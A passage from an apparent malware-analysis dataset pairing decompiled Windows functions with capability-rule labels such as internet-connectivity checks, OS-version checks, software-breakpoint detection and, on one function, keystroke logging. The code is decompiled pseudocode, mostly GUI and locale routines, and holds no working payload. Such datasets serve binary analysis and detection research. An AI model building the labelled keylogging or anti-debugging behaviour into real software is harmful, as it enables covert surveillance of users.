        "decompiled_code": "\nvoid fcn.00443b9c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n            iVar1 = fcn.00441bd0();\n            iVar2 = *(in_EAX + 0xc) >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar2 = *(in_EAX + 0x54) - iVar2;\n            iVar3 = fcn.00441c3c(iVar1, iVar2);\n            iVar3 = iVar3 + iVar1;\n            iVar4 = iVar2 + *(in_EAX + 0xc);\n        }\n        else {\n            iVar1 = *(in_EAX + 0xc) >> 1;\n            if (iVar1 < 0) {\n                iVar1 = iVar1 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar1 = *(in_EAX + 0x50) - iVar1;\n            iVar2 = fcn.00441bd0(iVar1);\n            iVar3 = iVar1 + *(in_EAX + 0xc);\n            iVar4 = fcn.00441c3c(iVar1, iVar2, iVar3);\n            iVar4 = iVar4 + iVar2;\n        }\n        iVar4 = fcn.0041d0f0(iVar1, iVar2, iVar3, iVar4);\n        iVar3 = *(in_EAX + 0x58);\n        uVar5 = sub.gdi32.dll_SelectObject(iVar3, iVar4);\n        sub.gdi32.dll_PatBlt(*(in_EAX + 0x58), iVar3, iVar4, iVar1 - iVar3, iVar2 - iVar4, 0x5a0049);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 0x58), uVar5);\n    }\n    return;\n}\n",
        "token_count": 509
    },
    "00444024": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444024(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    piVar3 = arg_8h + -4;\n    iVar1 = *(*piVar3 + 0x18);\n    if (*(*(*(*piVar3 + 0x60) + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.00441bd0();\n        if (*(*piVar3 + 0x54) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x54) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.00443d18();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x54)) {\n            *(*piVar3 + 0x54) = iVar2 - iVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.00441bd0();\n        if (*(*piVar3 + 0x50) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x50) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.00443d18();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x50)) {\n            *(*piVar3 + 0x50) = iVar2 - iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 324
    },
    "0044449c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044449c(uint param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    *(in_EAX + 4) = 1;\n    *(in_EAX + 8) = 5;\n    if (((**0x462204 == 2) && (3 < **0x461f30)) ||\n       ((**0x462204 == 1 && ((4 < **0x461f30 || ((**0x461f30 == 4 && (9 < **0x4620e8)))))))) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    *(in_EAX + 0xd) = uVar1;\n    fcn.00444610();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 281
    },
    "00444574": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00444574(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (***0x461f44)(0x13);\n    *(in_EAX + 0xc) = '\\x01' - (iVar1 == 0);\n    return;\n}\n",
        "token_count": 70
    },
    "00444590": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00444590(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = (***0x461f44)(0x4b);\n    cVar2 = '\\x01' - (iVar1 == 0);\n    *(in_EAX + 0x20) = cVar2;\n    if (cVar2 != '\\0') {\n        sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "00445e00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445e00(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 0x6a)) {\n        if (in_EAX[0x17] != 0) {\n            cVar1 = *(in_EAX[0x17] + 0x58);\n            if (cVar1 == '\\x01') {\n                *(in_EAX + 0x6a) = param_2;\n                return;\n            }\n            if (cVar1 == '\\x02') {\n                param_2 = '\\x01';\n            }\n        }\n        iVar3 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                piVar2 = fcn.00403408();\n                if (piVar2 != NULL) {\n                    (**(*piVar2 + 0x54))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *(in_EAX + 0x6a) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "004465b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004465b4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x446661;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.00403228();\n    *(in_EAX + 0x4c) = uVar1;\n    if (((*(in_EAX + 0x30) < 1) || (0x8000 < *(in_EAX + 0x30))) || (*(in_EAX + 0x34) < 1)) {\n        fcn.00405b0c();\n        fcn.0040b538();\n        fcn.004039e4();\n    }\n    *(in_EAX + 0x38) = 4;\n    *(in_EAX + 0x41) = 1;\n    fcn.0044749c();\n    *(in_EAX + 0x43) = 0;\n    *(in_EAX + 0x44) = 0x1fffffff;\n    *(in_EAX + 0x48) = 0x1fffffff;\n    uVar1 = fcn.00421984();\n    *(in_EAX + 0x50) = uVar1;\n    fcn.00446680();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x446668;\n    uStack20 = 0x446660;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 385
    },
    "00446850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446850(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.00447424();\n    if (param_2 == NULL) {\n        (**(**(in_EAX + 0x50) + 100))();\n    }\n    else {\n        cVar1 = fcn.00421fb8();\n        if (cVar1 == '\\x01') {\n            (**(*param_2 + 100))();\n        }\n        else {\n            (**(*param_1 + 8))();\n            (**(*param_1 + 0x6c))();\n            (**(*param_1 + 100))();\n        }\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00450a38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00450a38(uint arg_8h)\n\n{\n    int16_t in_AX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (in_AX == 1) {\n        uVar3 = 0x200000;\n    }\n    uVar1 = fcn.0043fd08(0xfffffff0);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    return uVar2 & 0xffffff00 | (uVar2 & uVar3) != 0;\n}\n",
        "token_count": 144
    },
    "00450ae8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00450ae8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar1 = fcn.0043fd08(0xfffffff0);\n    sub.user32.dll_GetWindowLongA(uVar1);\n    if (*(in_EAX + 0x18) == '\\x01') {\n        iVar2 = fcn.00450a6c(&stack0xfffffffc);\n        iVar3 = fcn.00438f74();\n        iVar2 = iVar2 + iVar3;\n    }\n    else {\n        iVar2 = fcn.00450a6c(&stack0xfffffffc);\n        iVar3 = fcn.00438f30();\n        iVar2 = iVar2 + iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 197
    },
    "00450b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00450b80(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_4h;\n    \n    var_1ch = 0x1c;\n    var_18h = 0x10;\n    iVar1 = *(*(arg_8h + -8) + 6);\n    uVar2 = fcn.0043fd08(*(*(arg_8h + -4) + 0x18) == '\\x01', &var_1ch);\n    iVar3 = (***0x461e50)(uVar2);\n    iVar4 = iVar1;\n    if (iVar3 != 0) {\n        iVar4 = var_4h;\n    }\n    return iVar4;\n}\n",
        "token_count": 203
    },
    "0045526c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045526c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar *in_EDX;\n    \n    if (*(in_EAX + 0x150) == '\\x01') {\n        *in_EDX = 1;\n        *in_ECX = *(in_EAX + 0x158);\n    }\n    else {\n        *in_EDX = 0;\n        fcn.00403ffc();\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00457d24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00457d24(void)\n\n{\n    char in_AL;\n    uint uStack8;\n    int32_t iStack4;\n    \n    uStack8 = 8;\n    iStack4 = -(in_AL != '\\0');\n    sub.user32.dll_SystemParametersInfoA(0x49, 8, &uStack8, 0);\n    return;\n}\n",
        "token_count": 81
    },
    "00458f6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00458f6c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(in_EAX + 0xb0) != 0) {\n        iVar1 = sub.user32.dll_IsDialogMessageA(*(in_EAX + 0xb0), param_2);\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 115
    },
    "00459cf4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00459cf4(int32_t arg_8h)\n\n{\n    uint8_t in_AL;\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_IsWindowVisible(*(*(arg_8h + -4) + 0x30));\n    if ((1U - (iVar1 == 0) == *0x461de4) && (in_AL != *0x461de4)) {\n        sub.user32.dll_SetWindowPos(*(*(arg_8h + -4) + 0x30), 0, 0, 0, 0, 0, *(in_AL * 2 + 0x461de8));\n        *0x461de4 = in_AL;\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "00408298": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00408298(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0xffffffff;\n    if (((param_2 & 3) < 3) && ((param_2 & 0xf0) < 0x41)) {\n        uVar1 = fcn.00404468(*((param_2 & 3) * 4 + 0x461140), *(((param_2 & 0xf0) >> 4) * 4 + 0x46114c), 0, 3, 0x80, 0);\n        uVar1 = sub.kernel32.dll_CreateFileA(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 166
    },
    "0040842c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.0040842c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00404268();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    while (cVar1 = fcn.0040beec(),  cVar1 == '\\x02') {\n        iVar2 = iVar2 + -1;\n    }\n    return in_EAX + -1 + iVar2;\n}\n",
        "token_count": 114
    },
    "0040845c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040845c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = fcn.00404268();\n    fcn.00404468();\n    do {\n        if (iVar2 < 1) {\n            return iVar2;\n        }\n        if ((*(param_2 + -1 + iVar2) != '\\0') && (iVar3 = fcn.00408760(),  iVar3 != 0)) {\n            cVar1 = fcn.0040beec();\n            if (cVar1 != '\\x02') {\n                return iVar2;\n            }\n            iVar2 = iVar2 + -1;\n        }\n        iVar2 = iVar2 + -1;\n    } while( true );\n}\n",
        "token_count": 185
    },
    "00408f71": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408f71(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    char *unaff_EDI;\n    char *pcVar5;\n    char *pcVar6;\n    uint var_2ch;\n    uint var_5h;\n    \n    uVar3 = *(unaff_EBP + 8);\n    if (0x11 < uVar3) {\n        uVar3 = 0x12;\n    }\n    iVar2 = *(unaff_EBP + -0x2c);\n    if (iVar2 < 1) {\n        pcVar5 = unaff_EDI + 1;\n        *unaff_EDI = '0';\n    }\n    else {\n        iVar4 = 0;\n        if (*(unaff_EBP + 0x10) != '\\x02') {\n            iVar4 = (*(unaff_EBP + -0x2c) - 1U) % 3 + 1;\n        }\n        while( true ) {\n            pcVar6 = unaff_EDI;\n            cVar1 = fcn.00408ec6();\n            pcVar5 = pcVar6 + 1;\n            *pcVar6 = cVar1;\n            iVar2 = extraout_ECX + -1;\n            uVar3 = extraout_EDX;\n            if (iVar2 == 0) break;\n            iVar4 = iVar4 + -1;\n            unaff_EDI = pcVar5;\n            if ((iVar4 == 0) && (*(unaff_EBP + -6) != '\\0')) {\n                *pcVar5 = *(unaff_EBP + -6);\n                iVar4 = 3;\n                unaff_EDI = pcVar6 + 2;\n            }\n        }\n    }\n    if (uVar3 != 0) {\n        pcVar6 = pcVar5;\n        if (*(unaff_EBP + -5) != '\\0') {\n            pcVar6 = pcVar5 + 1;\n            *pcVar5 = *(unaff_EBP + -5);\n        }\n        for (; iVar2 != 0; iVar2 = iVar2 + 1) {\n            *pcVar6 = '0';\n            uVar3 = uVar3 - 1;\n            if (uVar3 == 0) {\n                return;\n            }\n            pcVar6 = pcVar6 + 1;\n        }\n        do {\n            cVar1 = fcn.00408ec6();\n            *pcVar6 = cVar1;\n            pcVar6 = pcVar6 + 1;\n        } while (extraout_EDX_00 != 1);\n    }\n    return;\n}\n",
        "token_count": 643
    },
    "00409b4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409b4c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char **in_EDX;\n    uint *in_FS_OFFSET;\n    char **ppcStackY328;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack296 = 0x409c2a;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    fcn.00403fa8();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    if (in_EAX < 3) {\n        fcn.00404040();\n    }\n    else {\n        fcn.00404040();\n    }\n    uVar1 = fcn.00404468(&fcn.00409b4c::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.00409b4c::var_14h, uVar1);\n    ppcStackY328 = 0x409bdd;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        ppcStackY328 = 0x409bf3;\n        fcn.00404218();\n        if ((in_EAX == 1) && (**in_EDX == '0')) {\n            fcn.00404268();\n            fcn.004044c8();\n            ppcStackY328 = in_EDX;\n        }\n    }\n    *in_FS_OFFSET = ppcStackY328;\n    fcn.00403fa8(0x409c31);\n    return;\n}\n",
        "token_count": 493
    },
    "0040c4cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040c4cc(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uchar uVar6;\n    uint lpCharType;\n    uint lpSrcStr;\n    \n    *0x463740 = 0x409;\n    *0x463744 = 9;\n    *0x463748 = 1;\n    uVar2 = sub.kernel32.dll_GetThreadLocale_1();\n    if (uVar2 != 0) {\n        *0x463740 = uVar2;\n    }\n    if (uVar2 != 0) {\n        *0x463744 = uVar2 & 0x3ff;\n        *0x463748 = (uVar2 & 0xffff) >> 10;\n    }\n    puVar4 = 0x40c620;\n    puVar5 = 0x46110c;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    if (*0x4610c4 == 2) {\n        cVar1 = fcn.0040c4b4();\n        uVar6 = cVar1 == '\\0';\n        if (uVar6) {\n            fcn.0040c454(&stack0xfffffffc);\n            fcn.00402d88();\n            *0x46374c = !uVar6;\n            if (*0x46374c) {\n                *0x46374d = 0;\n            }\n            else {\n                iVar3 = 0x80;\n                puVar4 = &lpSrcStr;\n                do {\n                    *puVar4 = iVar3;\n                    iVar3 = iVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                } while (iVar3 != 0x100);\n                sub.kernel32.dll_GetStringTypeExA(*0x463740, 2, &lpSrcStr, 0x80, &lpCharType);\n                iVar3 = 0x80;\n                puVar4 = &lpCharType;\n                do {\n                    *0x46374d = *puVar4 == 2;\n                    if (*0x46374d) {\n                        return;\n                    }\n                    puVar4 = puVar4 + 2;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n        }\n        else {\n            *0x46374d = 0;\n            *0x46374c = 0;\n        }\n    }\n    else {\n        iVar3 = sub.user32.dll_GetSystemMetrics(0x4a);\n        *0x46374d = iVar3 != 0;\n        iVar3 = sub.user32.dll_GetSystemMetrics(0x2a);\n        *0x46374c = iVar3 != 0;\n        if (*0x46374c) {\n            fcn.0040c454(&stack0xfffffffc);\n        }\n    }\n    return;\n}\n",
        "token_count": 699
    },
    "00410a68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410a68(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint8_t uVar4;\n    \n    pcVar1 = **param_2;\n    uVar4 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar4 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar2 & 0xffffff);\n        *puVar3 = param_1;\n        if ((1 < uVar4) && (*puVar3 = param_1,  3 < uVar4)) {\n            *puVar3 = param_1;\n        }\n    }\n    else if (*(param_2 + 0xb) < 0xfe) {\n        (*pcVar2)();\n    }\n    else {\n        (**(pcVar2 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "0041a164": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a164(int32_t arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41a1ce;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    if ((arg_14h < 0) || (2 < arg_14h)) {\n        uVar2 = 0x80030001;\n        *in_FS_OFFSET = uStack36;\n    }\n    else {\n        iVar1 = (**(**(arg_8h + 0xc) + 0x14))();\n        if (arg_18h != NULL) {\n            *arg_18h = iVar1;\n            arg_18h[1] = iVar1 >> 0x1f;\n        }\n        uVar2 = 0;\n        *in_FS_OFFSET = uStack36;\n    }\n    return uVar2;\n}\n",
        "token_count": 285
    },
    "0041e0e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e0e4(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint lpSystemInfo;\n    int16_t iStack16;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = param_2;\n    var_4h = in_EAX;\n    sub.kernel32.dll_GetSystemInfo(&lpSystemInfo);\n    var_8h = var_8h + -1;\n    if (-1 < var_8h) {\n        if (iStack16 == 3) {\n            do {\n                uVar1 = *(var_4h + var_8h * 4);\n                *(var_4h + var_8h * 4) = uVar1 >> 0x10 & 0xff | CONCAT11(uVar1, uVar1 >> 8) << 8;\n                var_8h = var_8h + -1;\n            } while (-1 < var_8h);\n        }\n        else {\n            do {\n                uVar1 = *(var_4h + var_8h * 4);\n                *(var_4h + var_8h * 4) = ((uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) >> 8;\n                var_8h = var_8h + -1;\n            } while (-1 < var_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 355
    },
    "00437238": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00437238(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint lParam;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    if (in_EAX != 0) {\n        uVar1 = sub.user32.dll_SendMessageA();\n    }\n    return uVar1;\n}\n",
        "token_count": 114
    },
    "0043c6a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0043c6a4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack32 = 0x43c6bb;\n    iVar1 = fcn.0043ca38();\n    if (iVar1 == 0) {\n        return;\n    }\n    puStack32 = 0x43c6cf;\n    iVar1 = fcn.00403228();\n    puStack32 = 0x43c6da;\n    fcn.0043c5a0();\n    uStack36 = 0x43c78b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar2 = fcn.0043ca38();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0043c9fc();\n            if (*(iVar3 + 0x5b) - 3U < 2) {\n                fcn.0043c9fc();\n                fcn.00413a08();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00403454();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x43c792;\n    while (0 < *(iVar1 + 8)) {\n        uStack36 = 0x43c74b;\n        iVar2 = fcn.00413b64();\n        if (*(iVar2 + 0x5b) == '\\x03') {\n            uStack36 = 0x43c758;\n            fcn.00438a40();\n        }\n        else {\n            uStack36 = 0x43c761;\n            fcn.00438a40();\n        }\n        uStack36 = 0x43c770;\n        fcn.00413a54();\n    }\n    uStack36 = 0x43c782;\n    fcn.00403258();\n    uStack36 = 0x43c78a;\n    fcn.0043c5a8();\n    return;\n}\n",
        "token_count": 519
    },
    "0044cc64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
